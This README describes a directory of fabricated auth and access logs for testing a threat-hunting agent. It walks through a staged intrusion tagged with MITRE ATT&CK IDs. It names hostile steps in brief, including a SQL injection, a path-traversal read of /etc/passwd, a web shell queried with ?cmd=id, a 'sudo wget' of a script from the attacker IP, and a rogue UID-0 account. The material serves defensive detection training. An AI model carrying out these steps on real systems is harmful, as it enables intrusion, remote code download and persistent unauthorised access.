# Sample logs (synthetic)

These are **fabricated** logs for demoing and testing the hunt agent. No real
systems, people, or IPs are involved - all addresses are in the reserved
documentation ranges from RFC 5737 (`203.0.113.0/24`, `198.51.100.0/24`).

Run the hunt agent against this directory:

```bash
python hunt.py --logs samples
```

## The incident these logs describe

`auth.log` and `access.log` tell one coherent story you can verify by hand:

1. **Recon / brute force (T1595, T1110)** - `203.0.113.66` sprays invalid
   usernames over SSH, then hammers the real `backupsvc` account, while also
   fuzzing web paths (`gobuster` user-agent) and probing with `sqlmap`.
2. **Initial access (T1078)** - after ~7 failures, `backupsvc` logs in
   successfully from that same IP: a brute force that worked. In parallel, a
   SQLi `union select ... from users` returns HTTP 200, and a path-traversal
   request pulls `/etc/passwd` (also 200).
3. **Execution / web shell (T1505.003, T1059)** - `/uploads/shell.php` is
   POSTed, then hit with `?cmd=id` / `?cmd=whoami`, both returning 200.
4. **Privilege escalation (T1548.003)** - `backupsvc` runs `sudo /bin/bash`
   and `sudo wget http://203.0.113.66/x.sh` (T1105, tool transfer).
5. **Persistence (T1136)** - a new UID-0 account `svc_backup` is created and
   immediately logs in from the attacker IP.

A good exercise: read the raw logs yourself first, write down the timeline,
then run the agent and compare its findings to yours.
